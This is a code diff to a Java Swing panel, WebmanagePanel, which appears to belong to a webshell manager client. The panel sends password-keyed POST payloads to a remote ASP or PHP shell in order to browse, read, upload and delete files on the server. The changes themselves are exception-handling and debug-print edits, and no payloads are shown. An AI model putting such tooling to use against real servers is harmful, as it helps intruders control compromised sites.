@@ -7,6 +7,7 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 import java.awt.event.MouseListener;
 import java.io.UnsupportedEncodingException;
+import java.lang.reflect.InvocationTargetException;
 import java.net.URLEncoder;
 import java.util.Enumeration;
 import java.util.Map;
@@ -83,7 +84,6 @@ public class WebmanagePanel extends JPanel {
 		path.setBounds(57, 5, 750, 24);
 		add(path);
 		path.setColumns(10);
-		
 		JLabel label = new JLabel("\u8DEF\u5F84\uFF1A");
 		label.setBounds(14, 11, 45, 18);
 		add(label);
@@ -116,10 +116,10 @@ public class WebmanagePanel extends JPanel {
 				String fileval = WebmanagePanel.this.main.getFileIO().read(filePath);
 				try {
 					upload(WebmanagePanel.this.path.getText()+"/"+name, fileval);
-				} catch (UnsupportedEncodingException e) {
+				} catch (Exception e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
-				}
+				} 
 			}
 		});
 		delMenu.addActionListener(new ActionListener() {
@@ -130,10 +130,11 @@ public class WebmanagePanel extends JPanel {
 				if(SelectPath!=null && SelectPath.length()>0){
 					try {
 						del(SelectPath);
-					} catch (UnsupportedEncodingException e1) {
+						
+					}catch (Exception e1) {
 						// TODO Auto-generated catch block
 						e1.printStackTrace();
-					}
+					} 
 				}
 			}
 		});
@@ -151,16 +152,21 @@ public class WebmanagePanel extends JPanel {
 							temp = temp+"/";
 						}
 						path.setText(temp+table.getValueAt(index, 1));
-						get_ReadDict();
+						try {
+							get_ReadDict();
+						} catch (Exception e) {
+							// TODO Auto-generated catch block
+							e.printStackTrace();
+						} 
 					}else{
 						//文件编辑
 						String SelectPath = path.getText()+"/"+table.getValueAt(table.getSelectedRow(), 1);
 						try {
 							readFile(SelectPath);
-						} catch (UnsupportedEncodingException e) {
+						} catch (Exception e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
-						}
+						} 
 					}
 				}
 			}
@@ -214,7 +220,12 @@ public class WebmanagePanel extends JPanel {
 						}
 	            	}
 					path.setText(pathtxt);
-					get_ReadDict();
+					try {
+						get_ReadDict();
+					} catch (Exception e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					} 
 					tree.updateUI();
 				}
 			}
@@ -228,7 +239,12 @@ public class WebmanagePanel extends JPanel {
 		//读取按钮事件
 		readbtn.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				get_ReadDict();
+				try {
+					get_ReadDict();
+				} catch (Exception e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} 
 				tree.updateUI();
 				//DefaultMutableTreeNode node = path_createTreeNode(path.getText());
 				//path_createTreeNode(path.getText());//目录树同步
@@ -251,6 +267,7 @@ public class WebmanagePanel extends JPanel {
 			root = new DefaultMutableTreeNode("root");
 			DefaultTreeModel treeModel = new DefaultTreeModel(root);
 			tree.setModel(treeModel);
+			System.out.println(resArr[1]);
 			if(resArr[0].indexOf("\\")!=-1 || resArr[2].indexOf("Win")!=-1){//判断为win系统
 				String dirves[] = null;
 				resArr[1] = resArr[1].replace(":", ":\t");//c:d:e:替换为:\t 便于分割
@@ -272,7 +289,7 @@ public class WebmanagePanel extends JPanel {
 			status.setText("完成");
 		}
 	}
-	private void get_ReadDict(){
+	private void get_ReadDict() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException{
 		String[] temp = null;
 		postText="";
 		if(scriptType.toUpperCase().equals("ASP")){
@@ -287,13 +304,12 @@ public class WebmanagePanel extends JPanel {
 			postText = password+"="+payload.get(scriptType.toUpperCase()+"_READDICT");
 			postText = postText+"&"+payload.get("PARAM1")+"="+base64.encodeBase64(path.getText().getBytes());
 		}
-		System.out.println("2.GET_READDICT"+postText);
 		resultText = http.postSend(url, postText);
 		temp = analysisClass.resultAnalysis(resultText, "\n");
 		createTable(temp);//穿件右边列表
 		path_AddTree(path_createTreeNode(path.getText()), temp);;//目录树同步
 	}
-	private void readFile(String path) throws UnsupportedEncodingException{
+	private void readFile(String path) throws UnsupportedEncodingException, ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException{
 		postText = password+"=";
 		if(scriptType.toUpperCase().equals("PHP")){
 			path = base64.encodeBase64(path.getBytes());
@@ -309,9 +325,8 @@ public class WebmanagePanel extends JPanel {
 			postText = postText+"&"+payload.get("PARAM1")+"="+path;
 		}
 		String resValue = http.postSend(url, postText);
-		System.out.println(resValue);
 	}
-	private void del(String path) throws UnsupportedEncodingException{
+	private void del(String path) throws UnsupportedEncodingException, ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException{
 		postText = password+"=";
 		if(scriptType.toUpperCase().equals("PHP")){
 			path = base64.encodeBase64(path.getBytes());
@@ -334,7 +349,7 @@ public class WebmanagePanel extends JPanel {
 			status.setText("删除失败");
 		}
 	}
-	private void upload(String remotePath,String values) throws UnsupportedEncodingException{
+	private void upload(String remotePath,String values) throws UnsupportedEncodingException, ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException{
 		if(scriptType.toUpperCase().equals("PHP")){
 			String path = base64.encodeBase64(remotePath.getBytes());
 			path = URLEncoder.encode(path, "UTF-8");
@@ -369,9 +384,7 @@ public class WebmanagePanel extends JPanel {
 		}else{
 			postText = password+"="+payload.get(scriptType.toUpperCase()+"_MAKE")+"&"+payload.get("ACTION")+"="+payload.get(scriptType.toUpperCase()+"_INDEX");
 		}
-		System.out.println("1.GET_INDEX="+postText);
 		resultText = http.postSend(url, postText);
-		System.out.println(resultText);
 		temp = analysisClass.resultAnalysis(resultText,"\t");
 		if(temp!=null && temp.length>0){
 			return temp;
